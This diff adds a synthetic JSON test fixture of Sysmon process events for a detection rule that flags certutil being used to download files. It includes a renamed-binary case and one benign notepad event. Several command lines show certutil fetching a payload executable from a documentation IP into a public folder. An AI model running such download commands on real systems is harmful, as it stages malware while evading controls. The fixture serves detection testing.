@@ -1,0 +1,31 @@
+{
+  "description": "certutil URL downloads: classic dash form, uppercase path with slash flag, renamed binary caught via OriginalFileName, plus one unrelated event that must not count.",
+  "source": "synthetic: hand-written Sysmon EID 1 events modelled on LOLBAS certutil examples",
+  "expected_matches": 3,
+  "events": [
+    {
+      "EventID": 1,
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "OriginalFileName": "CertUtil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/payload.exe C:\\Users\\Public\\p.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+      "EventID": 1,
+      "Image": "C:\\WINDOWS\\SYSTEM32\\CERTUTIL.EXE",
+      "CommandLine": "CERTUTIL /URLCACHE /f HTTPS://cdn.example.net/a.dat a.dat"
+    },
+    {
+      "EventID": 1,
+      "Image": "C:\\Users\\Public\\cu.exe",
+      "OriginalFileName": "CertUtil.exe",
+      "CommandLine": "cu.exe -verifyctl -f https://203.0.113.9/x.bin"
+    },
+    {
+      "EventID": 1,
+      "Image": "C:\\Windows\\System32\\notepad.exe",
+      "OriginalFileName": "NOTEPAD.EXE",
+      "CommandLine": "notepad.exe C:\\notes.txt"
+    }
+  ]
+}
